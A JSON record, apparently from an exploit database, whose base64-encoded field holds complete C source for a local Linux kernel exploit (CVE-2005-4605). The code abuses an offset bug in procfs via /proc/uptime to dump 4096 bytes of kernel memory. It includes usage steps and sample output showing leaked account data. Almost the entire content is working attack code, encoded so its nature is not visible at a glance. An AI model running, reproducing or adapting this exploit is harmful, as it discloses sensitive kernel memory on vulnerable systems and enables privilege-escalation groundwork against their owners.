{
    "source": "exploit-database", 
    "exploit": "LyogDQogKiBjdmUtMjAwNS00NjA1LmMNCiAqDQogKiBMaW51eCBLZXJuZWwgPCAyLjYuMTQuNiBwcm9jZnMgS2VybmVsIE1lbW9yeSBEaXNjbG9zdXJlDQogKiBKb24gT2JlcmhlaWRlIDxqb25Ab2JlcmhlaWRlLm9yZz4NCiAqIGh0dHA6Ly9qb24ub2JlcmhlaWRlLm9yZw0KICogDQogKiBJbmZvcm1hdGlvbjoNCiAqIA0KICogICBodHRwOi8vY3ZlLm1pdHJlLm9yZy9jZ2ktYmluL2N2ZW5hbWUuY2dpP25hbWU9Q1ZFLTIwMDUtNDYwNQ0KICogDQogKiAgIFRoZSBwcm9jZnMgY29kZSAocHJvY19taXNjLmMpIGluIExpbnV4IDIuNi4xNC4zIGFuZCBvdGhlciB2ZXJzaW9ucyBiZWZvcmUNCiAqICAgMi42LjE1IGFsbG93cyBhdHRhY2tlcnMgdG8gcmVhZCBzZW5zaXRpdmUga2VybmVsIG1lbW9yeSB2aWEgdW5zcGVjaWZpZWQgDQogKiAgIHZlY3RvcnMgaW4gd2hpY2ggYSBzaWduZWQgdmFsdWUgaXMgYWRkZWQgdG8gYW4gdW5zaWduZWQgdmFsdWUuIA0KICogDQogKiBVc2FnZToNCiAqDQogKiAgICQgZ2NjIGN2ZS0yMDA1LTQ2MDUuYyAtbyBjdmUtMjAwNS00NjA1DQogKiAgICQgLi9jdmUtMjAwNS00NjA1DQogKiAgIFsrXSBPcGVuZWQgL3Byb2MvdXB0aW1lLg0KICogICBbK10gU2VlayB0byBvZmZzZXQgNDI5NDk2MzE5OS4NCiAqICAgWytdIFJlYWQgNDA5NiBieXRlcywgZHVtcGluZyB0byBzdGRvdXQuLi4NCiAqICAgLi4uDQogKiAgIC4uLiAwMCAwMCAwMCAwMCAxMSAwMCAwMCAwMCAgLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4NCiAqICAgLi4uIDNhIDMwIDNhIDcyIDZmIDZmIDc0IDAwICBsb2NhbGhvc3QuLi4uLi4ucm9vdC54LjA6MDpyb290Lg0KICogICAuLi4gMGQgMDAgMDAgMDAgZGMgOTEgMGYgMDggIC9yb290Li9iaW4vYmFzaC4uLi4uQC4uLi4uLi4uLi4uDQogKiAgIC4uLiBiYyBhZiAwZSAwOCAwMCAwMCAwMCAwMCAgLi4uLi4uLi4uLi4ucC4uLi4uLi4uLi4uLi4uLi4uLi4NCiAqICAgLi4uDQogKg0KICogTm90ZXM6DQogKiANCiAqICAgVGhpcyBvbmUgaXMgX2FuY2llbnRfLCBidXQgc3RyMGtlIHJlcXVlc3RlZCBpdCEgOy0pIA0KICovDQoNCiNkZWZpbmUgX0ZJTEVfT0ZGU0VUX0JJVFMgNjQNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHN0ZGJvb2wuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxpbnR0eXBlcy5oPg0KI2luY2x1ZGUgPGxpbWl0cy5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCg0KI2RlZmluZSBEVU1QIDQwOTYNCiNkZWZpbmUgUFJPQyAiL3Byb2MvdXB0aW1lIg0KDQojZGVmaW5lIFRZUEVfU0lHTkVEKHQpICghICgodCkgMCA8ICh0KSAtMSkpDQojZGVmaW5lIFRZUEVfTUFYKHQpICgodCkgKCEgVFlQRV9TSUdORUQgKHQpID8gKHQpIC0xIDogfiAofiAodCkgMCA8PCAoc2l6ZW9mICh0KSAqIENIQVJfQklUIC0gMSkpKSkNCg0KY29uc3QgY2hhciBoZXhfYXNjW10gPSAiMDEyMzQ1Njc4OWFiY2RlZiI7DQojZGVmaW5lIGhleF9hc2NfbG8oeCkgaGV4X2FzY1soKHgpICYgMHgwZildDQojZGVmaW5lIGhleF9hc2NfaGkoeCkgaGV4X2FzY1soKHgpICYgMHhmMCkgPj4gNF0NCg0Kdm9pZA0KaGV4X2R1bXBfdG9fYnVmZmVyKGNvbnN0IHZvaWQgKmJ1Ziwgc2l6ZV90IGxlbiwgaW50IHJvd3NpemUsIGludCBncm91cHNpemUsIGNoYXIgKmxpbmVidWYsIHNpemVfdCBsaW5lYnVmbGVuLCBib29sIGFzY2lpKQ0Kew0KCWNvbnN0IHVpbnQ4X3QgKnB0ciA9IGJ1ZjsNCgl1aW50OF90IGNoOw0KCWludCBqLCBseCA9IDA7DQoJaW50IGFzY2lpX2NvbHVtbjsNCg0KCWlmIChyb3dzaXplICE9IDE2ICYmIHJvd3NpemUgIT0gMzIpDQoJCXJvd3NpemUgPSAxNjsNCg0KCWlmICghbGVuKQ0KCQlnb3RvIG5pbDsNCglpZiAobGVuID4gcm93c2l6ZSkNCgkJbGVuID0gcm93c2l6ZTsNCglpZiAoKGxlbiAlIGdyb3Vwc2l6ZSkgIT0gMCkNCgkJZ3JvdXBzaXplID0gMTsNCg0KCXN3aXRjaCAoZ3JvdXBzaXplKSB7DQoJY2FzZSA4OiB7DQoJCWNvbnN0IHVpbnQ2NF90ICpwdHI4ID0gYnVmOw0KCQlpbnQgbmdyb3VwcyA9IGxlbiAvIGdyb3Vwc2l6ZTsNCg0KCQlmb3IgKGogPSAwOyBqIDwgbmdyb3VwczsgaisrKQ0KCQkJbHggKz0gc25wcmludGYobGluZWJ1ZiArIGx4LCBsaW5lYnVmbGVuIC0gbHgsDQoJCQkJIiUxNi4xNmxseCAiLCAodW5zaWduZWQgbG9uZyBsb25nKSoocHRyOCArIGopKTsNCgkJYXNjaWlfY29sdW1uID0gMTcgKiBuZ3JvdXBzICsgMjsNCgkJYnJlYWs7DQoJfQ0KDQoJY2FzZSA0OiB7DQoJCWNvbnN0IHVpbnQzMl90ICpwdHI0ID0gYnVmOw0KCQlpbnQgbmdyb3VwcyA9IGxlbiAvIGdyb3Vwc2l6ZTsNCg0KCQlmb3IgKGogPSAwOyBqIDwgbmdyb3VwczsgaisrKQ0KCQkJbHggKz0gc25wcmludGYobGluZWJ1ZiArIGx4LCBsaW5lYnVmbGVuIC0gbHgsDQoJCQkJIiU4Ljh4ICIsICoocHRyNCArIGopKTsNCgkJYXNjaWlfY29sdW1uID0gOSAqIG5ncm91cHMgKyAyOw0KCQlicmVhazsNCgl9DQoNCgljYXNlIDI6IHsNCgkJY29uc3QgdWludDE2X3QgKnB0cjIgPSBidWY7DQoJCWludCBuZ3JvdXBzID0gbGVuIC8gZ3JvdXBzaXplOw0KDQoJCWZvciAoaiA9IDA7IGogPCBuZ3JvdXBzOyBqKyspDQoJCQlseCArPSBzbnByaW50ZihsaW5lYnVmICsgbHgsIGxpbmVidWZsZW4gLSBseCwNCgkJCQkiJTQuNHggIiwgKihwdHIyICsgaikpOw0KCQlhc2NpaV9jb2x1bW4gPSA1ICogbmdyb3VwcyArIDI7DQoJCWJyZWFrOw0KCX0NCg0KCWRlZmF1bHQ6DQoJCWZvciAoaiA9IDA7IChqIDwgcm93c2l6ZSkgJiYgKGogPCBsZW4pICYmIChseCArIDQpIDwgbGluZWJ1ZmxlbjsNCgkJCSBqKyspIHsNCgkJCWNoID0gcHRyW2pdOw0KCQkJbGluZWJ1ZltseCsrXSA9IGhleF9hc2NfaGkoY2gpOw0KCQkJbGluZWJ1ZltseCsrXSA9IGhleF9hc2NfbG8oY2gpOw0KCQkJbGluZWJ1ZltseCsrXSA9ICcgJzsNCgkJfQ0KCQlhc2NpaV9jb2x1bW4gPSAzICogcm93c2l6ZSArIDI7DQoJCWJyZWFrOw0KCX0NCglpZiAoIWFzY2lpKQ0KCQlnb3RvIG5pbDsNCg0KCXdoaWxlIChseCA8IChsaW5lYnVmbGVuIC0gMSkgJiYgbHggPCAoYXNjaWlfY29sdW1uIC0gMSkpDQoJCWxpbmVidWZbbHgrK10gPSAnICc7DQoJZm9yIChqID0gMDsgKGogPCByb3dzaXplKSAmJiAoaiA8IGxlbikgJiYgKGx4ICsgMikgPCBsaW5lYnVmbGVuOyBqKyspDQoJCWxpbmVidWZbbHgrK10gPSAoaXNhc2NpaShwdHJbal0pICYmIGlzcHJpbnQocHRyW2pdKSkgPyBwdHJbal0NCgkJCQk6ICcuJzsNCm5pbDoNCglsaW5lYnVmW2x4KytdID0gJ1wwJzsNCn0NCg0Kdm9pZA0KcHJpbnRfaGV4X2R1bXAoaW50IHJvd3NpemUsIGludCBncm91cHNpemUsIGNvbnN0IHZvaWQgKmJ1Ziwgc2l6ZV90IGxlbiwgYm9vbCBhc2NpaSkNCnsNCgljb25zdCB1aW50OF90ICpwdHIgPSBidWY7DQoJaW50IGksIGxpbmVsZW4sIHJlbWFpbmluZyA9IGxlbjsNCgl1bnNpZ25lZCBjaGFyIGxpbmVidWZbMjAwXTsNCg0KCWlmIChyb3dzaXplICE9IDE2ICYmIHJvd3NpemUgIT0gMzIpDQoJCXJvd3NpemUgPSAxNjsNCg0KCWZvciAoaSA9IDA7IGkgPCBsZW47IGkgKz0gcm93c2l6ZSkgew0KCQlsaW5lbGVuID0gKChyZW1haW5pbmcpIDwgKHJvd3NpemUpID8gKHJlbWFpbmluZykgOiAocm93c2l6ZSkpOw0KCQlyZW1haW5pbmcgLT0gcm93c2l6ZTsNCgkJaGV4X2R1bXBfdG9fYnVmZmVyKHB0ciArIGksIGxpbmVsZW4sIHJvd3NpemUsIGdyb3Vwc2l6ZSwNCgkJbGluZWJ1Ziwgc2l6ZW9mKGxpbmVidWYpLCBhc2NpaSk7DQoJCXByaW50ZigiJXNcbiIsIGxpbmVidWYpOw0KCX0NCn0NCg0KaW50DQptYWluKHZvaWQpDQp7DQoJaW50IGZkLCByZXQ7DQoJY2hhciBidWZbRFVNUF07DQoJb2ZmX3Qgc2Vlaywgb2Zmc2V0PVRZUEVfTUFYKG9mZl90KTsNCg0KCW1lbXNldChidWYsIDAsIHNpemVvZihidWYpKTsNCg0KCWZkID0gb3BlbihQUk9DLCBPX1JET05MWSk7DQoJaWYgKGZkID09IC0xKSB7DQoJCXByaW50ZigiWy1dIEVycm9yIGR1cmluZyBvcGVuKDIpXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglwcmludGYoIlsrXSBPcGVuZWQgIiBQUk9DICIuXG4iKTsNCg0KCXNlZWsgPSBsc2VlayhmZCwgb2Zmc2V0LURVTVAsIFNFRUtfU0VUKTsNCglpZiAoc2VlayA9PSAtMSkgew0KCQlwcmludGYoIlstXSBFcnJvciBkdXJpbmcgbHNlZWsoMikuXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglwcmludGYoIlsrXSBTZWVrIHRvIG9mZnNldCAlbGxkLlxuIiwgc2Vlayk7DQoNCglyZXQgPSByZWFkKGZkLCBidWYsIERVTVApOw0KCWlmIChyZXQgPT0gLTEpIHsNCgkJcHJpbnRmKCJbLV0gRXJyb3IgZHVyaW5nIHJlYWQoMikuXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoJDQoJaWYgKHJldCA9PSAwKSB7DQoJCXByaW50ZigiWy1dIHJlYWQoMikgcmV0dXJuIDAgYnl0ZXMsIHlvdXIga2VybmVsIG1heSBub3QgYmUgdnVsbmVyYWJsZS5cbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCXByaW50ZigiWytdIFJlYWQgJWQgYnl0ZXMsIGR1bXBpbmcgdG8gc3Rkb3V0Li4uXG5cbiIsIHJldCk7DQoNCglzbGVlcCgzKTsNCg0KCXByaW50X2hleF9kdW1wKDMyLCAxLCBidWYsIHJldCwgMSk7DQoNCglyZXR1cm4gMDsNCn0NCg0KLy8gbWlsdzBybS5jb20gWzIwMDktMDgtMDVd", 
    "filename": "platforms/linux/local/9363.c", 
    "id": "9363", 
    "cves": [
        "CVE-2005-4605"
    ]
}